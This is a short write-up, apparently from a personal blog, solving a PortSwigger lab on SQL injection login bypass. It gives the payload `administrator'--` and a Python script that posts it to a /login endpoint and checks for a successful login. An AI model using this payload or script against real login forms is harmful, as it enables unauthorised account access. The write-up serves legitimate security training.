+++
date = '2026-06-03T15:22:16+08:00'
draft = false
title = 'SQL injection vulnerability allowing login bypass'
tags = ['training', 'PortSwigger', 'writeups', 'web-exploitation']
description = ''
showLastUpdated = true
+++
Very straightforward lab. Since we are trying to login as `administrator`, we can simply bypass the password check by having our payload as follow:
```
administrator'--
```
The trailing `--` will comment out everything proceeding it, thus skipping the password check

Alternatively, we can solve this with a Python script:
```python
import webbrowser
import requests
import sys
import urllib.parse

def inject(url):
    # Remove trailing slash
    url = url.rstrip("/")
    
    # Preparing payload
    url = f"{url}/login"
    params = {"username": "administrator'--", "password": "qwerty"}
    
    # Initiate request
    response = requests.post(url, data=params, allow_redirects=True)
    
    # Verify status code and open the webpage
    if response.status_code == 200:
        if "Log out" in response.text:
            print("Log in as administrator!")
        else:
            print("Failed to log in. Try again")
    else:
        print("Cannot initiate request")    
    
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <url>")
        sys.exit(1)
    inject(sys.argv[1])
```